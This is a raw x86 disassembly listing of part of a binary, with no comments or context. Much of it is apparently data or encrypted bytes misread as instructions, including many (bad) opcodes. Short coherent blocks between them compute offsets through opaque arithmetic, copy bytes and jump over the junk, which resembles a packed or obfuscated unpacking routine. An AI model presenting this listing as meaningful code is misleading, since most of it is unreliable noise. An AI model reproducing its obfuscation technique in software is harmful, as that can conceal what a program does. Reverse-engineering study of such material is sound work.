  40aeb7:	in     al,0x67
  40aeb9:	sub    DWORD PTR [ebx],ebx
  40aebb:	int3   
  40aebc:	jecxz  0x40aeca
  40aebe:	dec    ebx
  40aebf:	push   edx
  40aec0:	imul   ebx,DWORD PTR [ebp+0x7a],0x9847cda3
  40aec7:	cmp    ecx,esi
  40aec9:	scas   al,BYTE PTR es:[edi]
  40aeca:	jns    0x40af1d
  40aecc:	mov    ecx,0x43f9862d
  40aed1:	push   ds
  40aed2:	fcmovbe st,st(3)
  40aed4:	jg     0x40af2d
  40aed6:	in     al,dx
  40aed7:	or     BYTE PTR [eax+0x41],0x86
  40aedb:	dec    eax
  40aedc:	fwait
  40aedd:	idiv   DWORD PTR [esi]
  40aedf:	ins    DWORD PTR es:[edi],dx
  40aee0:	xor    al,0x8d
  40aee2:	jno    0x40aeec
  40aee4:	(bad)  
  40aee5:	fxch   st(5)
  40aee7:	sbb    eax,0x6248868a
  40aeec:	mov    al,0x70
  40aeee:	pop    es
  40aeef:	aas    
  40aef0:	int3   
  40aef1:	ret    
  40aef2:	and    DWORD PTR [bx+di],0xda4b984c
  40aef9:	rol    DWORD PTR [esi],0x9a
  40aefc:	jmp    edx
  40aefe:	mov    eax,0x65efa864
  40af03:	lea    eax,[ecx-0x1230831d]
  40af09:	aad    0xb9
  40af0b:	mov    esi,0xc371e6b8
  40af10:	sti    
  40af11:	mov    ds:0xedaf0baa,eax
  40af16:	sbb    ah,BYTE PTR [ecx]
  40af18:	fcomp  DWORD PTR [ebx]
  40af1a:	push   esi
  40af1b:	and    dl,BYTE PTR [esi-0x1f]
  40af1e:	(bad)  
  40af1f:	pop    ecx
  40af20:	xor    edi,edx
  40af22:	into   
  40af23:	sub    DWORD PTR [eax-0xa],esi
  40af26:	jbe    0x40aed9
  40af28:	cmp    eax,0xa4767ff4
  40af2d:	push   ds
  40af2e:	push   0xffffffed
  40af30:	fcmovnb st,st(0)
  40af32:	test   al,0x33
  40af34:	mov    eax,0xc1b7146e
  40af39:	mov    WORD PTR [ecx],?
  40af3b:	push   esp
  40af3c:	test   eax,0x9a19223f
  40af41:	sbb    edx,edx
  40af43:	rol    DWORD PTR [eax+0x193194c6],cl
  40af49:	loop   0x40af38
  40af4b:	xor    BYTE PTR [edi-0x2357fdbb],ah
  40af51:	(bad)  
  40af52:	jnp    0x40af46
  40af54:	push   ss
  40af55:	popa   
  40af56:	fiadd  WORD PTR [ecx+0xb]
  40af59:	popa   
  40af5a:	mov    esi,0x699526e
  40af5f:	push   esi
  40af60:	mul    BYTE PTR [edi-0x7bcd1d6e]
  40af66:	in     al,dx
  40af67:	mov    eax,0xe23d5c76
  40af6c:	or     BYTE PTR [edi+0x255c76bd],ch
  40af72:	test   eax,0xfdde8989
  40af77:	nop
  40af78:	jne    0x40afdf
  40af7a:	sub    eax,0xc66458cb
  40af7f:	jl     0x40afc4
  40af81:	les    eax,FWORD PTR [esi-0xf]
  40af84:	daa    
  40af85:	sbb    eax,0x68825dc7
  40af8a:	jno    0x40af96
  40af8c:	sbb    eax,0x2e0fb581
  40af91:	out    dx,eax
  40af92:	inc    ebp
  40af93:	sar    bl,0x90
  40af96:	ds jno 0x40afcb
  40af99:	lods   eax,DWORD PTR ds:[esi]
  40af9a:	dec    edi
  40af9b:	dec    edx
  40af9c:	cmovg  eax,eax
  40af9f:	sar    BYTE PTR [edi-0x55],cl
  40afa2:	pop    ss
  40afa3:	adc    BYTE PTR [eax+0x25],dl
  40afa6:	mov    al,0x5
  40afa8:	loopne 0x40afbf
  40afaa:	cmp    DWORD PTR [edx+0x44f5424a],esi
  40afb0:	call   0x6c1a876e
  40afb5:	lahf   
  40afb6:	inc    edx
  40afb7:	cmp    eax,0xf09636b9
  40afbc:	gs hlt 
  40afbe:	(bad)  
  40afbf:	push   edi
  40afc0:	lock and esp,DWORD PTR ds:0xd8c59d08
  40afc7:	adc    edi,DWORD PTR [ebp+0x7666094d]
  40afcd:	lds    esi,FWORD PTR [edx+edx*1+0x20]
  40afd1:	fisubr DWORD PTR [edi]
  40afd3:	in     al,0xa3
  40afd5:	pop    es
  40afd6:	test   eax,0xeb0a2f95
  40afdb:	push   ebp
  40afdc:	mov    esp,0xcaa2c3ae
  40afe1:	outs   dx,BYTE PTR ds:[esi]
  40afe2:	bound  edi,QWORD PTR [edi-0x1fa2740a]
  40afe8:	imul   edx,ebx
  40afeb:	mov    ebx,DWORD PTR [ebp-0x1c]
  40afee:	xor    edx,ebx
  40aff0:	sub    edx,0x26bd
  40aff6:	add    eax,ecx
  40aff8:	and    edx,0x7126
  40affe:	mov    ebx,ecx
  40b000:	sub    ebx,edx
  40b002:	mov    edx,DWORD PTR [ebp-0x18]
  40b005:	sub    eax,edx
  40b007:	mov    edx,DWORD PTR [ebp-0x14]
  40b00a:	sub    eax,edx
  40b00c:	mov    edx,DWORD PTR [ebp+0xc]
  40b00f:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40b016:	mov    BYTE PTR [eax-0xbb5],dl
  40b01c:	mov    eax,DWORD PTR [ebp-0x10]
  40b01f:	xor    eax,0xffffe1ce
  40b024:	add    eax,DWORD PTR [ebp-0xc]
  40b027:	xor    edx,edx
  40b029:	and    eax,0x6d33
  40b02e:	lea    ecx,[ecx+eax*1-0x6520]
  40b035:	mov    eax,DWORD PTR [ebp+0x8]
  40b038:	mov    ebx,DWORD PTR [ebp-0x4]
  40b03b:	add    eax,edi
  40b03d:	div    ebx
  40b03f:	mov    edx,DWORD PTR [ebp-0x8]
  40b042:	mov    ebx,0x940a7
  40b047:	sub    eax,edx
  40b049:	xor    edx,edx
  40b04b:	div    ebx
  40b04d:	add    eax,esi
  40b04f:	cmp    ecx,eax
  40b051:	jb     0x40aa71
  40b057:	xor    ebx,ebx
  40b059:	inc    ebx
  40b05a:	mov    DWORD PTR [ebp+0xc],0x77bd
  40b061:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40b068:	mov    DWORD PTR [ebp-0x8],0x4738
  40b06f:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40b076:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40b07d:	mov    DWORD PTR [ebp-0x14],0x64ec
  40b084:	mov    DWORD PTR [ebp-0x18],0x1984
  40b08b:	mov    DWORD PTR [ebp-0x1c],0x293
  40b092:	mov    eax,DWORD PTR [ebp+0x8]
  40b095:	mov    ecx,DWORD PTR [ebp+0xc]
  40b098:	add    eax,0x1ef2
  40b09d:	and    eax,ecx
  40b09f:	xor    eax,0x7240
  40b0a4:	mov    ecx,0x7aaa
  40b0a9:	sub    ecx,eax
  40b0ab:	mov    DWORD PTR [ebp+0xc],0x8d3
  40b0b2:	mov    DWORD PTR [ebp+0x8],0x2392
  40b0b9:	mov    DWORD PTR [ebp-0x20],ebx
  40b0bc:	mov    DWORD PTR [ebp-0x24],0x338f
  40b0c3:	mov    DWORD PTR [ebp-0x28],0x61c9
  40b0ca:	mov    eax,DWORD PTR [ebp+0x8]
  40b0cd:	mov    edx,DWORD PTR [ebp+0xc]
  40b0d0:	imul   eax,edx
  40b0d3:	xor    eax,0x40a0
  40b0d8:	or     eax,0x1a48
  40b0dd:	xor    eax,0x139ddb0
  40b0e2:	mov    esi,ecx
  40b0e4:	jmp    0x40b37b
  40b0e9:	stos   BYTE PTR es:[edi],al
  40b0ea:	(bad)  
  40b0eb:	mov    ss,WORD PTR [esi-0x355674c]
  40b0f1:	sub    BYTE PTR [edx],dh
  40b0f3:	inc    eax
  40b0f4:	(bad)  
  40b0f6:	out    dx,al
  40b0f7:	xchg   esp,eax
  40b0f8:	nop
  40b0f9:	ret    0xbeaf
  40b0fc:	mov    esi,0xbebec2a9
  40b101:	push   0xe4c20ebc
  40b106:	(bad)  
  40b108:	out    0x8f,eax
  40b10a:	mov    bl,0xeb
  40b10c:	pop    edx
  40b10d:	cmp    eax,DWORD PTR [ecx]
  40b10f:	dec    ebp
  40b110:	sbb    dh,BYTE PTR [edi+0x54]
  40b113:	mov    eax,0x68405e6f
  40b118:	push   es
  40b119:	pop    edi
  40b11a:	aam    0x9c
  40b11c:	fbstp  TBYTE PTR [edi]
  40b11e:	xchg   esi,eax
  40b11f:	push   ss
  40b120:	test   BYTE PTR [esi-0x59],bh
  40b123:	dec    ebx
  40b124:	mov    ch,0x2f
  40b126:	and    edi,esi
  40b128:	inc    ecx
  40b129:	push   esp
  40b12a:	or     edx,DWORD PTR [ebx-0x187d3e94]
  40b130:	cmp    ch,ch
  40b132:	xor    BYTE PTR [eax-0xf71d3de],bl
  40b138:	xor    al,0xb5
  40b13a:	or     eax,0xf5e767ed
  40b13f:	(bad)  
  40b140:	aaa    
  40b141:	fistp  DWORD PTR [ebx+0x539a1a16]
  40b147:	xchg   edx,eax
  40b148:	leave  
  40b149:	jne    0x40b0d9
  40b14b:	test   DWORD PTR [ecx],0xd690e85c
  40b151:	mov    ecx,DWORD PTR [esi+eax*4]
  40b154:	pushf  
  40b155:	mov    ds:0x66fa85c0,al
  40b15a:	push   ecx
  40b15b:	xchg   edi,eax
  40b15c:	pop    eax
  40b15d:	out    dx,eax
  40b15e:	scas   eax,DWORD PTR es:[edi]
  40b15f:	aas    
  40b160:	fsub   QWORD PTR [esi]
  40b162:	aam    0xa1
  40b164:	pop    esp
  40b165:	dec    ebx
  40b166:	fwait
  40b167:	jno    0x40b143
  40b169:	dec    ecx
  40b16a:	jo     0x40b1ab
  40b16c:	jns    0x40b1b3
  40b16e:	outs   dx,DWORD PTR ds:[esi]
  40b16f:	jl     0x40b13f
  40b171:	mov    ebx,0xe8de16d3
  40b176:	jne    0x40b134
  40b178:	xchg   ecx,eax
  40b179:	addr16 push edx
  40b17b:	or     ebp,DWORD PTR ds:0xd002a12c
  40b181:	das    
  40b182:	mov    esp,0xd912b86e
  40b187:	sbb    al,0xf6
  40b189:	jp     0x40b139
  40b18b:	pusha  
  40b18c:	and    edx,0x924559de
  40b192:	addr16 jb 0x40b1dc
  40b195:	jmp    0x40b13b
  40b197:	fcmovnb st,st(7)
  40b199:	imul   BYTE PTR [ebx]
  40b19b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b19c:	push   ss
  40b19d:	fnstenv [eax+0x55dd9fa2]
  40b1a3:	dec    esi
  40b1a4:	push   es
  40b1a5:	sbb    DWORD PTR [ecx+0x6b],esp
  40b1a8:	test   bh,0x26
  40b1ab:	sbb    DWORD PTR [ecx+0x38970d3b],eax
  40b1b1:	hlt    
  40b1b2:	sahf   
  40b1b3:	push   ds
  40b1b4:	rcr    DWORD PTR [edi+eiz*8-0x1ace85c4],0x47
  40b1bc:	mov    dl,BYTE PTR [ebp-0x6a]
  40b1bf:	icebp  
  40b1c0:	sti    
  40b1c1:	add    al,0xb0
  40b1c3:	pop    esi
  40b1c4:	mov    al,ds:0x9d159aeb
  40b1c9:	xchg   esi,eax
  40b1ca:	test   esi,ecx
  40b1cc:	test   BYTE PTR [edx+0x7dbc26b6],bl
  40b1d2:	fdiv   QWORD PTR [ebx-0x3d]
  40b1d5:	add    BYTE PTR ds:0x33239715,al
  40b1db:	adc    ah,BYTE PTR [ebx-0x2c137012]
  40b1e1:	scas   al,BYTE PTR es:[edi]
  40b1e2:	pop    esi
  40b1e3:	nop
  40b1e4:	inc    esi
  40b1e5:	ds mov gs,esp
  40b1e8:	add    ch,BYTE PTR [ebp-0x4f4e4ba4]
  40b1ee:	jecxz  0x40b204
  40b1f0:	lahf   
  40b1f1:	lods   al,BYTE PTR ds:[esi]
  40b1f2:	scas   al,BYTE PTR es:[edi]
  40b1f3:	(bad)  
  40b1f4:	je     0x40b250
  40b1f6:	pop    ss
  40b1f7:	pop    ecx
  40b1f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f9:	add    DWORD PTR [edx+0x74],ebx
  40b1fc:	cmp    al,ch
  40b1fe:	in     al,0x8
  40b200:	(bad)  
  40b201:	lods   al,BYTE PTR ds:[esi]
  40b202:	iret   
  40b203:	lods   al,BYTE PTR gs:[esi]
  40b205:	sub    ah,BYTE PTR [ebp-0x2c]
  40b208:	int    0x5
  40b20a:	inc    edi
  40b20b:	sbb    DWORD PTR [edx+esi*4-0x17740c57],edi
  40b212:	repz call 0xaa81:0x1fc249b9
  40b21a:	or     DWORD PTR ds:0x6f4457b,esp
  40b220:	loopne 0x40b20b
  40b222:	scas   eax,DWORD PTR es:[edi]
  40b223:	adc    BYTE PTR [ecx+0x24d9109e],dh
  40b229:	es stos BYTE PTR es:[edi],al
  40b22b:	jge    0x40b29b
  40b22d:	mov    dl,0x90
  40b22f:	mov    al,0x20
  40b231:	or     al,0x26
  40b233:	je     0x40b2ac
  40b235:	jne    0x40b27b
  40b237:	ds aam 0x21
  40b23a:	cld    
  40b23b:	int    0xc2
  40b23d:	mov    esp,0x479f5998
  40b242:	xchg   bh,bh
  40b244:	clc    
  40b245:	pop    ebp
  40b246:	out    dx,eax
  40b247:	in     eax,0x5e
  40b249:	xchg   edx,eax
  40b24a:	pop    ebp
  40b24b:	cmp    eax,0x19565c67
  40b250:	out    0xd6,eax
  40b252:	gs cs sub dl,bh
  40b256:	daa    
  40b257:	push   es
  40b258:	stos   DWORD PTR es:[edi],eax
  40b259:	fdiv   st(5),st
  40b25b:	outs   dx,DWORD PTR ds:[esi]
  40b25c:	mov    cl,bl
  40b25e:	mov    cl,0x5
  40b260:	xchg   edi,eax
  40b261:	std    
  40b262:	and    ebx,DWORD PTR [ebp-0x5fc340d0]
  40b268:	dec    esi
  40b269:	scas   al,BYTE PTR es:[edi]
  40b26a:	mov    dh,0xc9
  40b26c:	test   DWORD PTR [ebp+0x28],esp
  40b26f:	cs mov eax,0x94791619
  40b275:	mov    eax,ds:0xfe07eac7
  40b27a:	dec    al
  40b27c:	ds ins DWORD PTR es:[edi],dx
  40b27e:	push   es
  40b27f:	jbe    0x40b224
  40b281:	mov    bh,0x15
  40b283:	adc    bl,BYTE PTR [eax+ebp*4-0x7e]
  40b287:	jns    0x40b20c
  40b289:	mov    edx,?
  40b28b:	sbb    DWORD PTR [ecx+0x46088b4],ebx
  40b291:	cli    
  40b292:	imul   BYTE PTR gs:[esi+0xfe8bc11]
  40b299:	xor    dh,al
  40b29b:	mov    dl,0xcb
  40b29d:	cs scas eax,DWORD PTR es:[edi]
  40b29f:	ret    0xa938
  40b2a2:	shl    DWORD PTR [edx],0x64
  40b2a5:	fwait
  40b2a6:	push   0xffffff83
  40b2a8:	sub    ch,BYTE PTR [ebp+0x37c17e8e]
  40b2ae:	cmp    BYTE PTR [ebp+edi*8+0xe7292ad],ah
  40b2b5:	mov    eax,ds:0xa7e93535
  40b2ba:	sti    
  40b2bb:	adc    eax,0x3935f37d
  40b2c0:	jp     0x40b2dc
  40b2c2:	inc    eax
  40b2c3:	pop    sp
  40b2c5:	popa   
  40b2c6:	dec    ecx
  40b2c7:	jae    0x40b293
  40b2c9:	mov    dh,0x50
  40b2cb:	sbb    DWORD PTR [ecx+esi*1-0x2e768fbd],edx
  40b2d2:	push   edx
  40b2d3:	fldcw  WORD PTR [ebx+0x35b15257]
  40b2d9:	push   0xe21f0cc8
  40b2de:	cmc    
  40b2df:	push   edi
  40b2e0:	ss xchg ebp,eax
  40b2e2:	push   ebx
  40b2e3:	push   edx
  40b2e4:	fld    TBYTE PTR [eax-0x32004ea]
  40b2ea:	mov    ah,0xa6
  40b2ec:	cmp    BYTE PTR [ecx],bl
  40b2ee:	adc    DWORD PTR [ebx-0x44a47f48],ebx
  40b2f4:	inc    ebx
  40b2f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2f6:	pop    edx
  40b2f7:	pusha  
  40b2f8:	addr16 xchg ebx,eax
  40b2fa:	mov    edi,0x6e8e9b22
  40b2ff:	mov    ecx,0xc296cf06
  40b304:	daa    
  40b305:	rol    DWORD PTR ss:[ebp-0x40],1
  40b309:	aam    0xb8
  40b30b:	ja     0x40b33c
  40b30d:	or     esp,DWORD PTR [ebx]
  40b30f:	and    eax,0xa1c5a358
  40b314:	or     edx,DWORD PTR [ecx]
  40b316:	mov    bh,0x27
  40b318:	sbb    eax,0xb4e5ffeb
  40b31d:	loope  0x40b35e
  40b31f:	das    
  40b320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b321:	sbb    edx,DWORD PTR [esi-0x4bce6dee]
  40b327:	xchg   ebx,eax
  40b328:	or     esp,esi
  40b32a:	push   ebx
  40b32b:	pop    esi
  40b32c:	shl    bh,cl
  40b32e:	(bad)  
  40b330:	cmp    BYTE PTR [edx],bh
  40b332:	in     eax,dx
  40b333:	ror    DWORD PTR ds:0x3c02d07a,1
  40b339:	xor    BYTE PTR [ecx+0x61],0x3b
  40b33d:	pop    ecx
  40b33e:	es dec eax
  40b340:	pop    edi
  40b341:	icebp  
  40b342:	lea    esp,[ebp-0x15]
  40b345:	jo     0x40b35f
  40b347:	ror    DWORD PTR [edx-0x7cbd1df7],1
  40b34d:	sub    DWORD PTR [esi],edx
  40b34f:	int3   
  40b350:	sub    ebp,0xb84bd694
  40b356:	lds    esp,FWORD PTR [esi]
  40b358:	(bad)  
  40b359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b35a:	jmp    0x40b392
  40b35c:	es (bad) 
  40b35e:	shl    BYTE PTR [ebx],1
  40b360:	pop    edi
  40b361:	mov    ebp,0x4b1a32f4
  40b366:	mov    esp,0x77028d29
  40b36b:	(bad)  
  40b36c:	push   ss
  40b36d:	jne    0x40b369
  40b36f:	push   es
  40b370:	jg     0x40b395
  40b372:	aam    0x97
  40b374:	pop    edx
  40b375:	mov    dh,BYTE PTR [ebx+0x7c28285e]
  40b37b:	sub    esi,eax
  40b37d:	mov    eax,DWORD PTR [ebp-0x28]
  40b380:	mov    edx,DWORD PTR [ebp-0x24]
  40b383:	mov    edi,DWORD PTR [ebp-0x20]
  40b386:	or     eax,0x1cc2
  40b38b:	sub    eax,edx
  40b38d:	xor    edx,edx
  40b38f:	div    edi
  40b391:	mov    edx,DWORD PTR ds:0x4226b8
  40b397:	mov    edx,DWORD PTR [edx+0x1d4]
  40b39d:	sub    edx,eax
  40b39f:	mov    eax,DWORD PTR [ebp+0x10]
  40b3a2:	mov    al,BYTE PTR [esi+eax*1]
  40b3a5:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40b3ac:	mov    eax,DWORD PTR [ebp-0x1c]
  40b3af:	mov    edx,DWORD PTR [ebp-0x18]
  40b3b2:	imul   eax,edx
  40b3b5:	mov    edx,DWORD PTR [ebp-0x14]
  40b3b8:	imul   eax,eax,0x262b
  40b3be:	or     eax,edx
  40b3c0:	jmp    0x40b657
  40b3c5:	dec    ecx
  40b3c6:	mov    bl,0x7d
  40b3c8:	push   esp
  40b3c9:	mov    bh,0x74
  40b3cb:	pushf  
  40b3cc:	mov    esp,0xe3db5995
  40b3d1:	add    edi,DWORD PTR [edi]
  40b3d3:	hlt    
  40b3d4:	iret   
  40b3d5:	lods   eax,DWORD PTR ds:[esi]
  40b3d6:	mov    bl,0xbe
  40b3d8:	mov    esi,0xbebec2a9
  40b3dd:	std    
  40b3de:	hlt    
  40b3df:	xchg   ebx,eax
  40b3e0:	ret    
  40b3e1:	or     DWORD PTR [ebp-0x3f],ebx
  40b3e4:	or     al,0xbf
  40b3e6:	outs   dx,BYTE PTR ds:[esi]
  40b3e7:	ins    DWORD PTR es:[edi],dx
  40b3e8:	or     eax,0xd7c7890f
  40b3ed:	or     BYTE PTR [esi+0x1f342e8d],bh
  40b3f3:	cli    
  40b3f4:	call   0xab55:0x74c11ce9
  40b3fb:	(bad)  
  40b3fc:	pop    edi
  40b3fd:	pop    eax
  40b3fe:	dec    ebx
  40b3ff:	inc    ebp
  40b400:	and    edi,DWORD PTR [ebp-0x4b]
  40b403:	inc    si
  40b405:	mov    dh,0x77
  40b407:	daa    
  40b408:	ffree  st(1)
  40b40a:	fdiv   st(6),st
  40b40c:	mov    bl,0xc
  40b40e:	or     ebx,DWORD PTR [bx+di+0x3b]
  40b412:	dec    edx
  40b413:	xor    ecx,0xcd33136b
  40b419:	mov    al,0xe5
  40b41b:	mov    cl,0x1b
  40b41d:	std    
  40b41e:	cld    
  40b41f:	xor    ebx,DWORD PTR [ebx-0x46]
  40b422:	xchg   ebx,eax
  40b423:	push   edi
  40b424:	test   eax,0x547042db
  40b429:	ins    DWORD PTR es:[edi],dx
  40b42a:	cwde   
  40b42b:	sbb    dh,BYTE PTR ds:0x72cfbcaa
  40b431:	mov    gs:0xb5b2f084,eax
  40b437:	dec    esi
  40b438:	adc    BYTE PTR [esp+ebx*2+0x13],dl
  40b43c:	xchg   esp,eax
  40b43d:	mov    gs,WORD PTR [ebp-0x7e88535]
  40b443:	jnp    0x40b45e
  40b445:	fcmovnu st,st(4)
  40b447:	pop    ebp
  40b448:	scas   al,BYTE PTR es:[edi]
  40b449:	jle    0x40b424
  40b44b:	xlat   BYTE PTR ds:[ebx]
  40b44c:	inc    edi
  40b44d:	cmp    esi,ecx
  40b44f:	repnz imul eax,DWORD PTR [ebx+ecx*2],0xffffff99
  40b454:	xchg   esi,eax
  40b455:	pop    ebp
  40b456:	mov    esp,0x2d8d9362
  40b45b:	sub    cl,BYTE PTR [edi-0xc98d5ad]
  40b461:	push   esi
  40b462:	jp     0x40b3ef
  40b464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b465:	aas    
  40b466:	pop    es
  40b467:	push   esi
  40b468:	cmp    dh,BYTE PTR [ebp+ebx*8-0x414d789e]
  40b46f:	inc    esi
  40b470:	push   esp
  40b471:	inc    eax
  40b472:	sbb    ecx,edi
  40b474:	nop
  40b475:	out    dx,al
  40b476:	sbb    eax,ebp
  40b478:	sbb    ecx,DWORD PTR [ebx-0x4e3660cf]
  40b47e:	fcomip st,st(6)
  40b480:	or     cl,BYTE PTR [edi-0x4e1b2d48]
  40b486:	cmp    DWORD PTR [ebp-0x3e],ebp
  40b489:	sbb    DWORD PTR [edx+0x4b],ebx
  40b48c:	push   0xeadbfbc3
  40b491:	ror    DWORD PTR [bp+di+0x7c],cl
  40b495:	imul   dl
  40b497:	adc    BYTE PTR [edx],dh
  40b499:	inc    ebx
  40b49a:	push   ebx
  40b49b:	xchg   DWORD PTR [esi-0xb],ebx
  40b49e:	cmp    al,0x41
  40b4a0:	cli    
  40b4a1:	outs   dx,BYTE PTR ds:[esi]
  40b4a2:	call   0x2e2244b7
  40b4a7:	xor    DWORD PTR [esi+edx*4+0xe0ad21f],ebp
  40b4ae:	inc    edx
  40b4af:	aaa    
  40b4b0:	xchg   DWORD PTR [edi+0x4],edi
  40b4b3:	xchg   esi,eax
  40b4b4:	jecxz  0x40b525
  40b4b6:	out    dx,al
  40b4b7:	cmp    BYTE PTR [esi],bh
  40b4b9:	or     edi,0x32fb4b0c
  40b4bf:	sub    al,0x15
  40b4c1:	pop    edi
  40b4c2:	inc    esi
  40b4c3:	es clc 
  40b4c5:	or     DWORD PTR [edx],edx
  40b4c7:	pop    edi
  40b4c8:	addr16 loop 0x40b477
  40b4cb:	xor    eax,0x28facea3
  40b4d0:	xchg   edi,eax
  40b4d1:	clc    
  40b4d2:	scas   eax,DWORD PTR es:[edi]
  40b4d3:	and    al,0x20
  40b4d5:	pop    ds
  40b4d6:	push   ebp
  40b4d7:	inc    edx
  40b4d8:	fidiv  DWORD PTR [esi-0x11ed5a40]
  40b4de:	(bad)  
  40b4df:	dec    ecx
  40b4e0:	and    ecx,ecx
  40b4e2:	in     eax,0x3f
  40b4e4:	push   ebp
  40b4e5:	cdq    
  40b4e6:	xchg   ecx,eax
  40b4e7:	cs inc esp
  40b4e9:	pop    es
  40b4ea:	int    0xa9
  40b4ec:	or     esi,0x3e
  40b4ef:	retf   0xae44
  40b4f2:	dec    edi
  40b4f3:	repz sub eax,0x9d2c76a1
  40b4f9:	adc    eax,0x59a3742e
  40b4fe:	and    BYTE PTR [edi+edx*1+0x8],cl
  40b502:	jmp    0x40b529
  40b504:	loop   0x40b573
  40b506:	in     eax,0x13
  40b508:	and    ebx,DWORD PTR [ebx]
  40b50a:	add    ebx,DWORD PTR [edx]
  40b50c:	loop   0x40b4ea
  40b50e:	outs   dx,DWORD PTR ds:[esi]
  40b50f:	rol    BYTE PTR ds:0x890d3abc,1
  40b515:	adc    al,BYTE PTR [esi-0x1d]
  40b518:	or     ecx,DWORD PTR [ecx-0x16a940f7]
  40b51e:	mov    ah,0xe1
  40b520:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40b522:	(bad)  
  40b523:	pop    DWORD PTR [ebp-0x6]
  40b526:	mov    cl,0xdd
  40b528:	pop    ds
  40b529:	ss push esp
  40b52b:	icebp  
  40b52c:	jmp    0x40b578
  40b52e:	xchg   BYTE PTR [edx+0x1a9b2aed],ah
  40b534:	push   ebp
  40b535:	dec    ebx
  40b536:	outs   dx,DWORD PTR ds:[esi]
  40b537:	arpl   WORD PTR [esi],bx
  40b539:	in     al,0x8a
  40b53b:	mov    ebx,0xfa43a2cd
  40b540:	xchg   ebp,eax
  40b541:	push   esi
  40b542:	jle    0x40b570
  40b544:	sbb    DWORD PTR [ebx+0x35617a41],ebp
  40b54a:	gs mov edx,0xf20b4948
  40b550:	xor    BYTE PTR [ebx-0x34dc0d61],dl
  40b556:	arpl   WORD PTR [ebp+0x60],di
  40b559:	dec    ax
  40b55b:	in     al,0xf6
  40b55d:	ror    DWORD PTR [edx],0x83
  40b560:	pusha  
  40b561:	in     al,0xa9
  40b563:	int3   
  40b564:	cdq    
  40b565:	jmp    0xfee4:0xcee7d378
  40b56c:	iret   
  40b56d:	mov    esp,0x47a58eca
  40b572:	fs cs cwde 
  40b575:	jnp    0x40b5d2
  40b577:	mov    bh,BYTE PTR [esi+edx*2]
  40b57a:	mov    WORD PTR [eax-0x10],cs
  40b57d:	mov    edx,0x2b31cd01
  40b582:	retf   
  40b583:	sti    
  40b584:	add    DWORD PTR [esi+0x4039f03e],edx
  40b58a:	iret   
  40b58b:	sub    al,0xb0
  40b58d:	sub    edi,DWORD PTR [ecx]
  40b58f:	ss nop
  40b591:	icebp  
  40b592:	sub    DWORD PTR [eax-0x7c],edx
  40b595:	sbb    esi,DWORD PTR [edi+0x70]
  40b598:	cs (bad) 
  40b59a:	adc    eax,0x34c26815
  40b59f:	mov    ebp,0x468e5dd0
  40b5a4:	jmp    0x634c:0x146231d8
  40b5ab:	jne    0x40b5dd
  40b5ad:	(bad)  
  40b5ae:	push   ds
  40b5af:	stos   DWORD PTR es:[edi],eax
  40b5b0:	dec    eax
  40b5b1:	dec    ecx
  40b5b2:	repnz mov es,WORD PTR [eax-0x71998a2a]
  40b5b9:	cmc    
  40b5ba:	scas   al,BYTE PTR es:[edi]
  40b5bb:	fcmovnb st,st(3)
  40b5bd:	or     bh,BYTE PTR [ecx+0x6d]
  40b5c0:	push   0xb
  40b5c2:	nop
  40b5c3:	fsubr  QWORD PTR [ebp+0x5]
  40b5c6:	mov    eax,ds:0xbc1795a9
  40b5cb:	xchg   ebx,eax
  40b5cc:	cmp    edx,DWORD PTR [edi+eax*2-0x6fad5b6b]
  40b5d3:	repz dec ebp
  40b5d5:	pop    edi
  40b5d6:	dec    ecx
  40b5d7:	push   ebp
  40b5d8:	out    0x38,al
  40b5da:	inc    edi
  40b5db:	icebp  
  40b5dc:	leave  
  40b5dd:	inc    DWORD PTR [edi+0x67]
  40b5e0:	daa    
  40b5e1:	fidiv  DWORD PTR [ebp+0x6d]
  40b5e4:	push   ds
  40b5e5:	sbb    al,0x94
  40b5e7:	sub    esi,DWORD PTR [eax*4-0x3c5b0a69]
  40b5ee:	xlat   BYTE PTR ds:[ebx]
  40b5ef:	sub    edi,DWORD PTR [ebx]
  40b5f1:	cwde   
  40b5f2:	mov    eax,ds:0x277aeab4
  40b5f7:	cwde   
  40b5f8:	rcr    BYTE PTR [edi+0x3c],0xf
  40b5fc:	mov    bh,0xd
  40b5fe:	push   ds
  40b5ff:	pop    edx
  40b600:	pop    ss
  40b601:	inc    edi
  40b602:	xchg   edx,eax
  40b603:	enter  0x5638,0x99
  40b607:	mov    ch,0x23
  40b609:	mov    ebx,DWORD PTR [eax+0x27]
  40b60c:	mov    al,0xad
  40b60e:	and    al,0x66
  40b610:	mov    dl,0x64
  40b612:	loop   0x40b5c9
  40b614:	les    edx,FWORD PTR [edi+0x3719cc19]
  40b61a:	cdq    
  40b61b:	rcr    DWORD PTR [esi+eiz*2+0x703b09c2],0x50
  40b623:	call   0xa782:0x4813286b
  40b62a:	shr    DWORD PTR [ebp+edx*4+0x4d],1
  40b62e:	ret    
  40b62f:	mov    ss,ebp
  40b631:	dec    ebp
  40b632:	outs   dx,BYTE PTR ds:[esi]
  40b633:	or     bl,ah
  40b635:	mov    ds:0x726544a9,eax
  40b63a:	push   eax
  40b63b:	fnsave [ebp-0x7]
  40b63e:	iret   
  40b63f:	sbb    bh,BYTE PTR [esi-0x58]
  40b642:	retf   0xa057
  40b645:	jl     0x40b647
  40b647:	xlat   BYTE PTR ds:[ebx]
  40b648:	popa   
  40b649:	fcom   st(2)
  40b64b:	sub    ebp,DWORD PTR [edi]
  40b64d:	adc    ebx,esi
  40b64f:	test   eax,0x90f35fbf
  40b654:	iret   
  40b655:	add    BYTE PTR [esi+0xbf0558b],ch
  40b65b:	ret    0xf635
  40b65e:	pop    ecx
  40b65f:	add    BYTE PTR [eax],al
  40b661:	lea    ecx,[ecx+eax*1+0x350559e6]
  40b668:	mov    eax,DWORD PTR [ebp-0xc]
  40b66b:	and    eax,0xddc
  40b670:	add    eax,DWORD PTR [ebp-0x8]
  40b673:	xor    eax,0x46e3
  40b678:	add    eax,0x50eb
